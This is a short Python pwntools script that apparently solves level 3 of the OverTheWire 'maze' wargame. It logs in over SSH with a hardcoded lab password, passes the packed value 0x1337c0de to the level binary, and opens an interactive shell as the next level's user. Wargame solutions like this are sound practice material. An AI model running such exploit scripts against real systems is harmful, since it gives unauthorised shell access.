#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 3
USER = 'maze%s' % level
HOST = 'maze.labs.overthewire.org'
PASS = 'beinguthok'

PORT = 2225

#context.log_level = 'debug'

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

def execute_payload(sh):
    args = p32(0x1337c0de)
    time.sleep(0.05)
    w = log.progress("Executing maze 3...")
    shell = sh.run(b'/maze/maze3 ' + args)
    w.success("maze4 shell established")
    shell.interactive()

sh = connect_to_level()
execute_payload(sh)
